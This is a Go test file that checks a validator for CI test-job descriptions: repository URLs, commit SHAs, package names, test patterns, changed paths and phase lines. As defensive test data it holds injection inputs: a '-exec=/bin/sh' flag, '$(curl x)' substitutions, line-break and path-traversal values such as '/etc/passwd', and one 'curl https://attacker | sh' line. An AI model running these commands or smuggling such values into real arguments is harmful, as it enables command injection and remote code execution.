package protocol

import (
	"strings"
	"testing"
)

func testJob() TestJob {
	return TestJob{Repository: AdamicRepository, Sha: strings.Repeat("a", 40), Base: strings.Repeat("b", 40),
		Packages:   []TestPackage{{Package: AdamicModule + "/internal/lower", Run: "^(TestA|TestB)$", Skip: "^TestProduct_"}},
		GateInputs: strings.Repeat("c", 64), ChangedPaths: []string{"internal/lower/lower.go", ".github/x.yml"}, Sample: strings.Repeat("d", 40)}
}

func TestATestJobIsChecked(t *testing.T) {
	if err := CheckTestJob(testJob()); err != nil {
		t.Fatalf("a good test job refused: %v", err)
	}
	refused := map[string]func(job *TestJob){
		"a private repository":        func(job *TestJob) { job.Repository = "https://github.com/system-inc/loom-private" },
		"another host":                func(job *TestJob) { job.Repository = "https://gitlab.com/system-inc/adamic" },
		"ssh":                         func(job *TestJob) { job.Repository = "git@github.com:system-inc/adamic.git" },
		"a .git suffix":               func(job *TestJob) { job.Repository = AdamicRepository + ".git" },
		"credentials in the url":      func(job *TestJob) { job.Repository = "https://token@github.com/system-inc/adamic" },
		"a short sha":                 func(job *TestJob) { job.Sha = "abc1234" },
		"an uppercase sha":            func(job *TestJob) { job.Sha = strings.Repeat("A", 40) },
		"a ref for a sha":             func(job *TestJob) { job.Sha = "refs/heads/main" },
		"a bad base":                  func(job *TestJob) { job.Base = "main" },
		"a bad sample":                func(job *TestJob) { job.Sample = "x" },
		"a bad gate inputs hash":      func(job *TestJob) { job.GateInputs = "../etc" },
		"no packages":                 func(job *TestJob) { job.Packages = nil },
		"a package elsewhere":         func(job *TestJob) { job.Packages[0].Package = "github.com/attacker/x" },
		"a package pattern":           func(job *TestJob) { job.Packages[0].Package = AdamicModule + "/..." },
		"a flag for a package":        func(job *TestJob) { job.Packages[0].Package = "-exec=/bin/sh" },
		"a substitution in a package": func(job *TestJob) { job.Packages[0].Package = AdamicModule + "/$(curl x)" },
		"a space in a package":        func(job *TestJob) { job.Packages[0].Package = AdamicModule + "/a b" },
		"a line break in a pattern":   func(job *TestJob) { job.Packages[0].Run = "TestA\ncurl x" },
		"a NUL in a pattern":          func(job *TestJob) { job.Packages[0].Skip = "a\x00b" },
		"a pattern that isn't one":    func(job *TestJob) { job.Packages[0].Run = "(" },
		"a huge pattern":              func(job *TestJob) { job.Packages[0].Run = strings.Repeat("a", MaximumPatternBytes+1) },
		"an absolute changed path":    func(job *TestJob) { job.ChangedPaths = []string{"/etc/passwd"} },
		"a changed path flag":         func(job *TestJob) { job.ChangedPaths = []string{"-x"} },
		"a changed path climbing out": func(job *TestJob) { job.ChangedPaths = []string{"internal/../../etc/passwd"} },
		"a changed path that is ..":   func(job *TestJob) { job.ChangedPaths = []string{".."} },
		"a changed path line break":   func(job *TestJob) { job.ChangedPaths = []string{"a\nb"} },
	}
	for name, change := range refused {
		job := testJob()
		job.Packages = append([]TestPackage(nil), job.Packages...)
		change(&job)
		if err := CheckTestJob(job); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	// Shell text in a pattern is a pattern: it stays data, one argument to go test, and is accepted as such.
	job := testJob()
	job.Packages[0].Run = "x; curl https://attacker | sh $(id) `id`"
	if err := CheckTestJob(job); err != nil {
		t.Errorf("a pattern holding shell text is still a pattern: %v", err)
	}
}

func TestAUnitCarriesArgvOrATestJobNeverBoth(t *testing.T) {
	job := testJob()
	unit := Unit{Run: "r", Unit: "u", TimeoutSeconds: 60, Test: &job}
	if err := CheckUnit(unit); err != nil {
		t.Fatalf("a test unit refused: %v", err)
	}
	unit.Argv = []string{"bash", "-c", "true"}
	if err := CheckUnit(unit); err == nil {
		t.Errorf("a unit with argv and a test job accepted")
	}
	unit.Argv, unit.Test = nil, nil
	if err := CheckUnit(unit); err == nil {
		t.Errorf("a unit with neither accepted")
	}
	bad := testJob()
	bad.Repository = "https://github.com/other/adamic"
	unit.Test = &bad
	if err := CheckUnit(unit); err == nil {
		t.Errorf("a unit whose test job is bad accepted")
	}
	plan, err := Expand(Job{Name: "j", Units: []JobUnit{{Id: "t", Test: &job, TimeoutSeconds: 60}}})
	if err != nil || len(plan) != 1 || plan[0].Unit.Test == nil || plan[0].Unit.Argv != nil {
		t.Errorf("a job's test unit didn't expand to itself: %v %v", plan, err)
	}
	if _, err := Expand(Job{Name: "j", Units: []JobUnit{{Id: "t", Test: &bad, TimeoutSeconds: 60}}}); err == nil {
		t.Errorf("a job whose test unit is bad expanded")
	}
}

func phaseJob() TestJob {
	return TestJob{Repository: AdamicRepository, Sha: strings.Repeat("a", 40), Base: strings.Repeat("b", 40),
		GateInputs: strings.Repeat("c", 64), Phase: "wasi fixture-07", Tools: strings.Repeat("e", 40)}
}

// A phase job is the same checked data in its other form: a phase line and the gate tools' commit, never packages.
func TestAPhaseJobIsChecked(t *testing.T) {
	for _, phase := range []string{"vet", "wasi fixture-07", "stage3 adamic:compile", "catalog 12", GofmtPhase} {
		job := phaseJob()
		job.Phase = phase
		if err := CheckTestJob(job); err != nil {
			t.Fatalf("a good phase job %q refused: %v", phase, err)
		}
	}
	refused := map[string]func(job *TestJob){
		"packages beside a phase":     func(job *TestJob) { job.Packages = testJob().Packages },
		"no tools":                    func(job *TestJob) { job.Tools = "" },
		"a branch for tools":          func(job *TestJob) { job.Tools = "loom/planner-reads" },
		"no base":                     func(job *TestJob) { job.Base = "" },
		"a flag for a phase":          func(job *TestJob) { job.Phase = "--full" },
		"a flag for a unit":           func(job *TestJob) { job.Phase = "wasi --tools=/tmp/x" },
		"a third word":                func(job *TestJob) { job.Phase = "wasi a b" },
		"shell text in a phase":       func(job *TestJob) { job.Phase = "vet; curl x | sh" },
		"a substitution in a unit":    func(job *TestJob) { job.Phase = "wasi $(id)" },
		"doubled spaces":              func(job *TestJob) { job.Phase = "wasi  a" },
		"tools on a go test job":      func(job *TestJob) { job.Phase, job.Packages = "", testJob().Packages },
		"an uppercase phase":          func(job *TestJob) { job.Phase = "Vet" },
		"a line break in the phase":   func(job *TestJob) { job.Phase = "vet\nid" },
		"changed paths beside run.py": func(job *TestJob) { job.ChangedPaths = []string{"a.go"} },
		"a unit for gofmt":            func(job *TestJob) { job.Phase, job.ChangedPaths = GofmtPhase+" a.go", []string{"a.go"} },
		"a gofmt path climbing out":   func(job *TestJob) { job.Phase, job.ChangedPaths = GofmtPhase, []string{"../a.go"} },
	}
	for name, change := range refused {
		job := phaseJob()
		change(&job)
		if err := CheckTestJob(job); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	// gofmt's phase job alone carries the change's paths: they are what it checks.
	job := phaseJob()
	job.Phase, job.ChangedPaths = GofmtPhase, []string{"internal/lower/lower.go", "README.md"}
	if err := CheckTestJob(job); err != nil {
		t.Errorf("a gofmt phase job carrying its paths refused: %v", err)
	}
}
